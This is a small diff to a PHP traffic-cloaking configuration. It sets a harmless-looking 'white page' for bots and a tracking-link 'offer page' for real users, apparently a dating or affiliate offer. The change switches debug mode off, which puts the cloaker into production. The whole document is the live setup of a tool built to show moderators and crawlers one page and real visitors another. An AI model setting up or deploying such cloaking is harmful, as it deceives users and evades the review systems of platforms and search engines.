@@ -2,7 +2,7 @@
 /* Required settings     */
 $CLOAKING['WHITE_PAGE'] = 'https://find-love.github.io/top/';//PHP/HTML file or URL used for bots
 $CLOAKING['OFFER_PAGE'] = 'http://silaconen.com/ZN9k?sub1=sub1&sub2=sub2&sub3=sub3&sub4=sub4&sub5=sub5';//PHP/HTML file or URL offer used for real users
-$CLOAKING['DEBUG_MODE'] = 'on';// replace "on" with "off" to switch from debug to production mode
+$CLOAKING['DEBUG_MODE'] = 'off';// replace "on" with "off" to switch from debug to production mode
 /*********************************************/
 /* Available additional settings  */
 
